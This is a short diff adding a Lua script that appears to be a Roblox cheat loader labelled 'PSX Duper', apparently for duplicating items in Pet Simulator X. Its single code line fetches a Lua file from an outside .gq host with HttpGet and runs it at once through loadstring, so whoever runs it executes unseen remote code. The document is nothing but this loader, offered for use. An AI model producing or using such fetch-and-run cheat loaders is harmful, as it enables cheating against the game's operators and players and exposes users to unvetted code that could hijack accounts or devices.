@@ -1,0 +1,3 @@
+--// PSX Duper
+--// Works On All Executors
+loadstring(game:HttpGet("https://fourdevils.gq/Duper.lua", true))()
